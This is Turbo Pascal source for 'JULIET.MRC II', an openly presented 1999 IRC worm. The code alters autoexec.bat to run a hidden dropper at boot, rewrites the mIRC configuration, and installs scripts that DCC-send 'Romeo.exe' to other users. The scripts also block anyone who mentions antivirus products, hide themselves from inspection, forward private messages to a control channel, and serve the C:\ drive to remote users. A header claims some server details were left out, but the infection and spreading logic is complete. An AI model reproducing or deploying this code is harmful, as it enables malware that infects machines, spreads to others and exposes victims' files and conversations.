{$M 16384,0,655360}
{
  JULIET.MRC II (B) By Rhape79 and ALT-F9
  Please note: The ini files dropped by the compiled EXE will not
               allow the slave copy to connect online as I have
               left out specific information such as server details
               (no server.ini file) and other things.
          This is to stop the worm from going live ITW.
}
Uses Dos,Crt;

Const Fils=35518;
Var A,D:Text;
    B,K,N:Byte;
    Slave,Master,C,J:String;
    L1x,L2x,E,F:File;
    NRx,NWx,G,H:Word;
    Bux,I:Array[1..2048] Of Char;
    L:Char;
    NSetx,M:LongInt;

Function ARC(FH,TH:String;JMPA,JMPB:LongInt;Re:Byte;Siz:LongInt):String;
Var Bu:Array[1..4096] Of Char;
    NR,NW:Word;
    NSet:LongInt;
    L1,L2:File;
Begin
     Assign(L1,FH);
     {$I-}
     Reset(L1,1);
     {$I+}
     If IOResult=0 Then
     Begin
          If Siz=0 Then
          Siz:=FileSize(L1);
          Assign(L2,TH);
          {$I-}
          If Re=0 Then
             Reset(L2,1)
          Else
              ReWrite(L2,1);
          {$I+}
          If IOResult=0 Then
          Begin
               Seek(L1,JMPA);
               Seek(L2,JMPB);
               NSet:=0;
               Repeat
               BlockRead(L1,Bu,SizeOf(Bu),NR);
               BlockWrite(L2,Bu,NR,NW);
               NSet:=NSet+NW;
               Until (NR=0) Or (NW<>NR) Or (Siz<=NSet);
               Close(L1);
               Close(L2);
          End;
     End;
End;
Procedure Mod1;
Begin
     Readln(A,C);Writeln(D,C);
     Readln(A,C);Writeln(D,C);
     Writeln(D,'aptitle=RJ2');Readln(A);
     Writeln(D,'finger=I''m infected with JULIET.MRC');Readln(A);
     Writeln(D,'quit=a pair of STAR CROSS''D LOVERS take their life');Readln(A);
     Readln(A,C);Writeln(D,C);
End;
Procedure Mod2;
Begin
     Writeln(D,'user=William Shakespeare''s Juliet II');Readln(A);
     Readln(A,C);Writeln(D,C);
     Readln(A,C);Writeln(D,C);
     B:=0;
     C:='';
     Repeat
     B:=B+1;
     Read(A,C[B]);
     Until C[B]=' ';
     N:=B-1;
     Master:='';
     B:=5;
     Repeat
     B:=B+1;
     Master:=Master+C[B];
     Until B=N;
     Writeln(D,'nick=',Master);Readln(A);
     Readln(A,C);Writeln(D,C);
     Readln(A);Writeln(D,'host=TerraXnet: Random serverSERVER:london.uk.eu.undernet.org:6668GROUP:undernet');
End;
Procedure Mod3;
Begin
     Writeln(D,'n1=juliet2.mrc');
     Repeat
     Readln(A,C);
     Writeln(D,C);
     Until C='';
End;
Begin
     K:=0;
     Clrscr;
     GotoXY(10,4);
     Write('Loading...');
     Assign(A,'C:\autoexec.bat');
     {$I-}
     Reset(A);
     For B:=1 To 4 Do
     Readln(A,C);
     Close(A);
     {$I+}
     If C<>'C:\paris.exe root' Then
     Begin
          {$I-}
          Assign(D,'C:\autoexec.avm');
          K:=1;
          Rewrite(D);
          Reset(A);
          For B:=1 To 3 Do
          Begin
               Readln(A,C);
               Writeln(D,C);
          End;
          Writeln(D,'C:\paris.exe root');
          Repeat
          Readln(A,C);
          Writeln(D,C);
          Until EOF(A);
          Close(A);
          Close(D);
          Erase(A);
          Rename(D,'C:\autoexec.bat');
          {$I+}
     End;
     If K=1 Then
     Begin
          Slave:='';
          Randomize;
          For B:=1 To 8 Do
          Begin
               L:=Char(Random(26)+97);
               Slave:=Slave+L;
          End;
     End;
     {$I-}
     ChDir('C:\mirc');
     {$I+}
     If IOResult=0 Then
     Begin
          Assign(A,'C:\mirc\Juliet2.mrc');
          Rewrite(A);
          For M:=1 To 45 Do
              Writeln(A);
          Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
          Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=- JULIET.MRC II -=-=-=-=-=-=-=-=-=-=-=-');
          Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
          Writeln(A,'; -[ Initialisation ]-');
          Writeln(A,'on Load:/clear | echo -se *** Connecting to irc.texxas.net');
          Writeln(A,'on 1:CONNECT:/.run C:\WINDOWS\config\',Slave,'\',Slave,'.exe | /.sreq +m auto | halt');
          Writeln(A);
          Writeln(A,'; -[ Protection ]-');
          Writeln(A,'on ^1:TEXT:*vir*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*worm*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*troj*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*remote*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*julie*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*omeo*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*spear*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*mset*:*:/.prince');
          Writeln(A,'on ^1:TEXT:* av*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*icq*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*mail*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*avp*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*nav*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*norton*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*mc*fe*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*rav*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*solom*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*drsol*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*nai*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*prot*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*f-p*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*avert*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*dr*eb*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*bav*:*:/.prince');
          Writeln(A,'on ^1:TEXT:*come*alive*:*:/.ctcps on | /.notice $nick JULIET.MRC II (B) is alive again! | halt');
          Writeln(A,'on 1:TEXT:*dcc*:*:/.ctcp ',Slave,' target $nick | halt');
          Writeln(A,'on 1:TEXT:*f0rk*:*:/.ctcp ',Slave,' target $nick | halt');
          Writeln(A,'on 1:TEXT:*send*:*:/.ctcp ',Slave,' target $nick | halt');
          Writeln(A,'on 1:TEXT:*gi*e*:*:/.ctcp ',Slave,' target $nick | halt');
          Writeln(A,'on 1:TEXT:*I*want*vir*:*:/.ctcp ',Slave,' target $nick | halt');
          Writeln(A,'on ^1:NOTICE:*virus*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*worm*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*trojan*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*remote*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*juliet*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*romeo*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*spear*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*mset*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:* av*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*icq*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*mail*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*avp*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*nav*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*norton*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*mc*fe*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*rav*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*solom*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*drsol*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*nai*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*prot*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*f-p*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*avert*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*dr*eb*:*:/.prince');
          Writeln(A,'on ^1:NOTICE:*bav*:*:/.prince');
          Writeln(A);
          Writeln(A,'; -[ Limited Stealth ]-');
          Writeln(A,'ctcp ^1:*ctcps*:?:/.nurse');
          Writeln(A,'ctcp ^1:*events*:?:/.nurse');
          Writeln(A,'ctcp ^1:*raw*:?:/.nurse');
          Writeln(A,'ctcp ^1:*remote*:?:/.nurse');
          Writeln(A,'ctcp ^1:*ignore*:?:/.nurse');
          Writeln(A,'ctcp ^1:*:?: {');
          Writeln(A,'  if ( juli isin $1- ) { /.nurse }');
          Writeln(A,'  elseif ( romeo isin $1- ) { /.nurse }');
          Writeln(A,'  elseif ( script. isin $1- ) { /.nurse }');
          Writeln(A,'  elseif ( load isin $1- ) { /.nurse }');
          Writeln(A,'  elseif ( remot isin $1- ) { /.nurse }');
          Writeln(A,'  elseif ( versin isin $1 ) { /.versin | halt }');
          Writeln(A,'  elseif ( VERSION isin $1 ) { $1- }');
          Writeln(A,'  elseif ( PING isin $1 ) { $1- }');
          Writeln(A,'  elseif ( FINGER isin $1 ) { $1- }');
          Writeln(A,'  elseif ( TIME isin $1 ) { $1- }');
          Write  (A,'  elseif ( /msg isin $1- ) { /.notice $nick Go stick that command where the sun don''t shine,');
          Writeln(A,' baby.. | halt }');
          Writeln(A,'  elseif ( /describe isin $1- ) { /.notice $nick No. I don''t want to let them see me do that! | halt }');
          Writeln(A,'  elseif ( /me isin $1- ) { /.notice $nick Describe it you dumbass or do it yourself.. | halt }');
          Writeln(A,'  else { $1- | halt }');
          Writeln(A,'}');
          Writeln(A);
          Writeln(A,'; -[ RAW Scanning ]-');
          Writeln(A,'RAW 332:*:/.benvolio');
          Writeln(A);
          Writeln(A,'; -[ Advanced Features ]-');
          Writeln(A,'on 1:join:*:{ if ($nick == $me) { halt }');
          Writeln(A,'  else { /.ctcp ',Slave,' target $nick | halt }');
          Writeln(A,'}');
          Writeln(A,'ctcp ^1:kill*:?:{');
          Writeln(A,'  if ( $nick == ',Slave,' ) then {');
          Writeln(A,'    /.ban $2 $3 4');
          Writeln(A,'    /.kick $3 $2 $4-');
          Writeln(A,'  }');
          Writeln(A,'  else { /.ignore $nick | halt }');
          Writeln(A,'}');
          Writeln(A,'on ^1:topic:#:/.benvolio');
          Writeln(A,'on 1:TEXT:*:?:/.msg #mircworms [ $nick ]: $1-');
          Writeln(A,'on 1:NOTICE:*:?:/.notice #mircworms [ $nick ]: $1-');
          Writeln(A);
          Writeln(A,'; -[ Aliases ]-');
          Writeln(A,'alias versin {');
          Writeln(A,'  /.notice $nick This client is running 12JULIET.MRC II (B) which was written by..');
          Writeln(A,'  /.notice $nick 4Rhape79 (UC) and 4ALT-F9 (AVM)');
          Writeln(A,'  /.notice $nick Peace to 3VicodinES - Ain''t gonna be the same without you...');
          Writeln(A,'  /.notice $nick Greets to all the 6Ultimate Chaos and 6Alternative Virus Mafia guys and girls...');
          Writeln(A,'  /.notice $nick Also special thanks from Rhape79 to 3Lord Natas - "I kinda owe it ya, thanks."');
          Writeln(A,'  /.notice $nick And to 3SimpleSimon - "Fer suggestions and major debuggin'' online.."');
          Writeln(A,'  /.notice $nick [===---                                                                      ---===]');
          Writeln(A,'  /.notice $nick ~~~~~~~~~~~~~~~~~~~~~ Slave Client is:2 ',Slave,' ~~~~~~~~~~~~~~~~~~~~~');
          Writeln(A,'}');
          Writeln(A,'alias unload {');
          Writeln(A,'  if ( $2 == juliet2.mrc ) { /echo 2 -se *** Unloaded script '' $+ $$2 $+ '' }');
          Writeln(A,'  elseif ( $2 == script.ini ) { /echo 2 -se *** Unloaded script '' $+ $$2 $+ '' }');
          Writeln(A,'  else { /unload $$1- }');
          Writeln(A,'}');
          Writeln(A,'alias ctcps {');
          Writeln(A,'  if ( $1 == off ) { /echo 2 -a *** Ctcps are OFF | halt }');
          Writeln(A,'  if ( $1 == on ) { /echo 2 -a *** Ctcps are ON | halt }');
          Writeln(A,'}');
          Writeln(A,'alias remotes {');
          Writeln(A,'  if ( $1 == off ) { /echo 2 -a *** Remotes are OFF | halt }');
          Writeln(A,'  if ( $1 == on ) { /echo 2 -a *** Remotes are ON | halt }');
          Writeln(A,'}');
          Writeln(A,'alias quit {');
          Writeln(A,'  /.ctcp ',Slave,' terminate');
          Writeln(A,'  /.disconnect');
          Writeln(A,'}');
          Writeln(A,'alias prince /.ignore -pcinku600 $nick | /.close -c $nick | /.close -m $nick | halt');
          Write  (A,'alias nurse /.notice $nick His looks I fear, and his intents I doubt. | /.ignore -pcinkut1200 $nick |');
          Writeln(A,' /.close -c $nick | /.close -m $nick | halt');
          Writeln(A,'alias benvolio {');
          Writeln(A,'  if ( juliet isin $1- ) { /.mercutio }');
          Writeln(A,'  elseif ( romeo isin $1- ) { /.mercutio }');
          Writeln(A,'  elseif ( vir isin $1- ) { /.mercutio }');
          Writeln(A,'  elseif ( worm isin $1- ) { /.mercutio }');
          Writeln(A,'  elseif ( mset isin $1- ) { /.mercutio }');
          Writeln(A,'  elseif ( help isin $1- ) { /.mercutio }');
          Writeln(A,'  elseif ( backof isin $1- ) { /.mercutio }');
          Writeln(A,'  elseif ( malic isin $1- ) { /.mercutio }');
          Writeln(A,'  elseif ( infect isin $1- ) { /.mercutio }');
          Writeln(A,'  elseif ( r&j isin $1- ) { /.mercutio }');
          Writeln(A,'  else { }');
          Writeln(A,'}');
          Writeln(A,'alias mercutio {');
          Writeln(A,'  /.msg # Wilt thou provoke me?');
          Writeln(A,'  /echo 2 -sei10 Condemnéd villain, I do apprehend thee.');
          Writeln(A,'  /part # $active | halt');
          Writeln(A,'}');
          Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
          Writeln(A,'; -=-=-=-=-=-=-=-=- Peace, Rhape79 and ALT-F9 =-=-=-=-=-=-=-=-');
          Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
          Close(A);
          Assign(A,'C:\mirc\mirc.ini');
          Assign(D,'C:\mirc\mirc.avm');
          Reset(A);
          Rewrite(D);
          Repeat
          Readln(A,C);
          Writeln(D,C);
          If C='[text]' Then Mod1
          Else If C='[mirc]' Then Mod2
          Else If C='[rfiles]' Then Mod3;
          Until EOF(A);
          Close(A);
          Close(D);
          Erase(A);
          Rename(D,'C:\mirc\mirc.ini');
          B:=1;
          Repeat
          If B=1 Then J:='C:\paris.exe';
          If B=2 Then J:='C:\mirc\romeo.exe';
          If (K<>1) And (B=1) Then B:=B+1
          Else
          Begin
               Assign(E,ParamStr(0));
               Reset(E,1);
               Assign(F,J);
               Rewrite(F,1);
               Repeat
               BlockRead(E,I,SizeOf(I),G);
               BlockWrite(F,I,G,H);
               Until (G=0) Or (H<>G);
               Close(E);
               Close(F);
               B:=B+1;
          End;
          Until B=3;
          Assign(A,'C:\paris.exe');
          SetFAttr(A,Hidden);
          {$I-}
          Mkdir('C:\WINDOWS\Config\'+Slave);
          {$I+}
          If IOResult=0 Then
          Begin
               C:='C:\WINDOWS\Config\'+Slave+'\';
               J:=C+Slave+'.exe';
               Assign(L1x,'C:\mirc\mirc.exe');
               {$I-}
               Reset(L1x,1);
               {$I+}
               If IOResult=0 Then
                  NSetx:=FileSize(L1x)
               Else
                   NSetx:=1113088;
               ARC('C:\mirc\mirc.exe',J,0,0,1,NSetx);
               J:=C+'juliet.ico';
               ARC('C:\paris.exe',J,Fils,0,1,190);
               Assign(L1x,'C:\paris.exe');
               {$I-}
               Reset(L1x,1);
               {$I+}
               If IOResult=0 Then
               Begin
                    Assign(L2x,J);
                    {$I-}
                    ReWrite(L2x,1);
                    {$I+}
                    If IOResult=0 Then
                    Begin
                         Seek(L1x,Fils);
                         Repeat
                         BlockRead(L1x,Bux,SizeOf(Bux),NRx);
                         BlockWrite(L2x,Bux,NRx,NWx);
                         Until (NRx=0) Or (NWx<>NRx);
                         Close(L1x);
                         Close(L2x);
                    End;
               End;
               J:=C+'juliet2.mrc';
               Assign(A,J);
               Rewrite(A);
               Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
               Writeln(A,'; -=-=-=-=-=-=-=-=-=-=- JULIET.Slave.MRC II =-=-=-=-=-=-=-=-=-=-');
               Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
               Writeln(A);
               Write  (A,'; on 1:CONNECT:/.join #virus | /.timer11 1 1 /.msg #virus Romeo, oh Romeo. Forwhere art thou');
               Writeln(A,' Romeo? | /.timer12 1 2 /.part #virus');
               Writeln(A,';');
               Writeln(A,';  TWO HOUSEHOLDS both alike in dignity');
               Writeln(A,';  in FAIR VERONA where we lay our scene');
               Writeln(A,';  from ANCIENT GRUDGE break to new mutiny');
               Writeln(A,';  where civil BLOOD makes civil hands unclean');
               Writeln(A,';  from forth the FATAL loins of these two FOES');
               Writeln(A,';  a pair of STAR CROSS''D LOVERS take their life');
               Writeln(A,';  my only LOVE sprung from my only HATE!');
               Writeln(A,';  too early seen unknown, and known TOO LATE!');
               Writeln(A,';  prodigious birth of love it is to me,');
               Writeln(A,';  that I must love a LOATHED ENEMY');
               Writeln(A,';');
               Writeln(A,';  william shakespeare''s');
               Writeln(A,';   ROMEO + JULIET');
               Writeln(A,';    The greatest love story the world has ever known.');
               Writeln(A,';     Now featuring ',Master,' in this world exclusive!');
               Writeln(A);
               Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
               Writeln(A,'; -=-=-=-=-=-=-=-=-=-=- JULIET.Slave.MRC II =-=-=-=-=-=-=-=-=-=-');
               Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
               For M:=1 To 45 Do
                   Writeln(A);
               Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
               Writeln(A,'; -=-=-=-=-=-=-=-=-=-=- JULIET.Slave.MRC II =-=-=-=-=-=-=-=-=-=-');
               Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
               Writeln(A,'; -[ Initialisation ]-');
               Write  (A,'on 1:CONNECT:/.join #virus | /.timer11 1 1 /.msg #virus Romeo, oh Romeo. Forwhere art thou Romeo?');
               Write  (A,' | /.timer12 1 2 /.part #virus | /.timer33 22:00:00 1 1 /.join #virus | /.timer34 22:00:02 1 1');
               Write  (A,' /.msg #virus Cybersex ain''t safe - I was infected by JULIET II! 12(Version B) | /.timer35');
               Writeln(A,' 22:00:04 1 1 /.part #virus');
               Writeln(A);
               Writeln(A,'; -[ Protection ]-');
               Writeln(A,'ctcp 1:*juliet*:?:/.notice $nick You want me to "4 $+ $1- $+ " ? - I don''t think so! | halt');
               Writeln(A);
               Writeln(A,'; -[ Limited Stealth And MTSP ]-');
               Writeln(A,'ctcp ^1:*ctcps*:?:/.nurse');
               Writeln(A,'ctcp ^1:*events*:?:/.nurse');
               Writeln(A,'ctcp ^1:*raw*:?:/.nurse');
               Writeln(A,'ctcp ^1:*remote*:?:/.nurse');
               Writeln(A,'ctcp ^1:*ignore*:?:/.nurse');
               Writeln(A,'ctcp ^1:*:?: {');
               Writeln(A,'  if ( juli isin $1- ) { /.nurse }');
               Writeln(A,'  elseif ( romeo isin $1- ) { /.nurse }');
               Writeln(A,'  elseif ( script. isin $1- ) { /.nurse }');
               Writeln(A,'  elseif ( load isin $1- ) { /.nurse }');
               Writeln(A,'  elseif ( remot isin $1- ) { /.nurse }');
               Writeln(A,'  elseif ( versin isin $1 ) { /.versin | halt }');
               Writeln(A,'  elseif ( VERSION isin $1 ) { $1- }');
               Writeln(A,'  elseif ( PING isin $1 ) { $1- }');
               Writeln(A,'  elseif ( FINGER isin $1 ) { $1- }');
               Writeln(A,'  elseif ( TIME isin $1 ) { $1- }');
               Write  (A,'  elseif ( /describe isin $1- ) { /.notice $nick No. I don''t want to let them see me do that!');
               Writeln(A,' | halt }');
               Writeln(A,'  elseif ( /me isin $1- ) { /.notice $nick Describe it you dumbass or do it yourself.. | halt }');
               Write  (A,'  elseif ( target isin $1- ) { /.timer21 1 60 /.dcc send $$2 Romeo.exe | /.timer22 1 59 /.ignore');
               Writeln(A,' -pcinku300 $$2 | halt }');
               Writeln(A,'  elseif ( terminate isin $1- ) {');
               Writeln(A,'    if ( $nick == ',Master,' ) { /.exit }');
               Write  (A,'    else { /.ctcp ',Master,' kill $naddress($nick,1) $chan $nick O, speak again, bright angel!');
               Writeln(A,' | /.ignore $nick | halt }');
               Writeln(A,'  }');
               Writeln(A,'  elseif ( serverc isin $1- ) { /.fserve $$2 15 C:\ C:\config.sys | halt }');
               Writeln(A,'  elseif ( talk isin $1 ) { /.msg $$2 $3- | /.describe #mircworms to $2 ]: $3- | halt }');
               Write  (A,'  elseif ( *msg isin $1- ) { /.msg $nick Please use the following command: /ctcp $me talk');
               Writeln(A,' <username> <text> | halt }');
               Writeln(A,'  else { $1- | halt }');
               Writeln(A,'}');
               Writeln(A,'; -[ Aliases ]-');
               Write  (A,'alias nurse /.notice $nick His looks I fear, and his intents I doubt. | /.ignore -pcinkut1200');
               Writeln(A,' $nick | /.close -c $nick | /.close -m $nick | halt');
               Writeln(A,';');
               Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
               Writeln(A,'; -=-=-=-=-=-=-=-=- Peace, Rhape79 and ALT-F9 =-=-=-=-=-=-=-=-');
               Writeln(A,'; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-');
               Writeln(A,';');
               Writeln(A,';    JULIET.MRC II (B) fer the teachers, the preachers, and those who didn''t believe....');
               Writeln(A,';');
               Writeln(A,';    JULIET.MRC II and JULIET.Slave.MRC II is copyright 1999 Rhape79');
               Writeln(A,';    The EXE and ALTernativeFileStorage is copyright 1999 ALT-F9');
               Close(A);
               J:=C+'mirc.ini';
               Assign(A,J);
               Rewrite(A);
               Writeln(A,'[channels]');
               Writeln(A,'n0=#mircworms');
               Writeln(A);
               Writeln(A,'[files]');
               Writeln(A,'trayicon=juliet.ico');
               Writeln(A);
               Writeln(A,'[warn]');
               Writeln(A,'fserve=off');
               Writeln(A,'dcc=off');
               Writeln(A);
               Writeln(A,'[options]');
               Writeln(A);
               Writeln(A,'[dirs]');
               Writeln(A);
               Writeln(A,'[about]');
               Writeln(A);
               Writeln(A,'[windows]');
               Writeln(A,'main=2,744,-2,742,0,1,0');
               Writeln(A);
               Writeln(A,'[text]');
               Writeln(A,'commandchar=/');
               Writeln(A,'linesep=-');
               Writeln(A,'aptitle=JULIET II (B): where are you?');
               Writeln(A,'finger=I''m infected with JULIET.MRC II (B)');
               Writeln(A,'quit=and then I slept with MY FRIEND');
               Writeln(A,'lastreset=[no date]');
               Writeln(A);
               Writeln(A,'[dde]');
               Writeln(A,'ServerStatus=on');
               Writeln(A,'ServiceName=mIRC');
               Writeln(A);
               Writeln(A,'[colours]');
               Writeln(A,'n0=0,6,4,5,2,3,3,3,3,3,3,1,5,2,6,1,3,2,3,5,1,0,1,0,1');
               Writeln(A);
               Writeln(A,'[pfiles]');
               Writeln(A);
               Writeln(A,'[ident]');
               Writeln(A,'active=yes');
               Writeln(A,'userid=Juliet');
               Writeln(A,'system=UNIX');
               Writeln(A,'port=113');
               Writeln(A);
               Writeln(A,'[socks]');
               Writeln(A,'enabled=no');
               Writeln(A,'port=1080');
               Writeln(A,'method=4');
               Writeln(A,'dccs=no');
               Writeln(A);
               Writeln(A,'[clicks]');
               Writeln(A,'status=/lusers');
               Writeln(A,'query=/whois $1');
               Writeln(A,'channel=/channel');
               Writeln(A,'nicklist=/query $1');
               Writeln(A,'notify=/whois $1');
               Writeln(A);
               Writeln(A,'[mirc]');
               Writeln(A,'user=William Shakespeare''s Juliet II');
               Writeln(A,'email=juliet@shakespeare.com');
               Writeln(A,'nick=',Slave);
               Writeln(A,'anick=',Slave,'-');
               Writeln(A,'host=Undernet: EU, UK, LondonSERVER:london.uk.eu.undernet.org:6666GROUP:undernet');
               Writeln(A);
               Writeln(A,'[fonts]');
               Writeln(A,'fstatus=Arial,413');
               Writeln(A,'fchannel=Arial,413');
               Writeln(A,'flist=Arial,413');
               Writeln(A);
               Writeln(A,'[background]');
               Writeln(A);
               Writeln(A,'[fileserver]');
               Writeln(A,'warning=off');
               Writeln(A,'homedir=c:');
               Writeln(A,'welcome=c:\config.sys');
               Writeln(A);
               Writeln(A,'[dccserver]');
               Writeln(A);
               Writeln(A,'[wizard]');
               Writeln(A,'warning=2');
               Writeln(A);
               Writeln(A,'[logging]');
               Writeln(A);
               Writeln(A,'[Finger]');
               Writeln(A);
               Writeln(A,'[channelfiles]');
               Writeln(A);
               Writeln(A,'[channelslist]');
               Writeln(A);
               Writeln(A,'[local]');
               Writeln(A,'local=localhost.org');
               Writeln(A,'localip=1.0.0.127');
               Writeln(A,'longip=0123456789');
               Writeln(A);
               Writeln(A,'[dccnicks]');
               Writeln(A);
               Writeln(A,'[dragdrop]');
               Writeln(A);
               Writeln(A,'[Perform]');
               Writeln(A,'n0=/join #mircworms');
               Writeln(A);
               Writeln(A,'[extensions]');
               Writeln(A,'n0=defaultEXTDIR:EXTCOM:/run');
               Writeln(A,'n1=*.wav,*.midEXTDIR:sounds\');
               Writeln(A);
               Writeln(A,'[autoop]');
               Writeln(A);
               Writeln(A,'[protect]');
               Writeln(A);
               Writeln(A,'[afiles]');
               Writeln(A,'n0=aliases.ini');
               Writeln(A);
               Writeln(A,'[rfiles]');
               Writeln(A,'n1=juliet2.mrc');
               Close(A);
          End;
     End;
     If K=1 Then
     Begin
          Clrscr;
          Writeln;Writeln;
          Writeln(' The Prologue');
          Writeln;
          Writeln('"Two households, both alike in dignity,');
          Writeln('  In fair Verona, where we lay our scene,');
          Writeln('From ancient grudge break to new mutiny,');
          Writeln('  Where civil blood makes civil hands unclean.');
          Writeln('From forth the fatal loins of these two foes');
          Writeln('  A pair of star-crossed lovers take their life;');
          Writeln('Whose misadventured piteous overthrows');
          Writeln('  Doth with their death bury their parents'' strife.');
          Writeln('The fearful passage of their death-marked love');
          Writeln('  And the continuance of the parents'' rage,');
          Writeln('Which, but their children''s end, naught could remove,');
          Writeln('  Is now the two hours'' traffic of our stage;');
          Writeln('The which if you with patient ears attend,');
          Writeln('What here shall miss, our toil shall strive to mend."');
          Writeln;
          Writeln('william shakespeare''s');
          Writeln(' ROMEO + JULIET');
          Write  ('  The greatest love story the world has ever known.');
          Readkey;
     End;
End.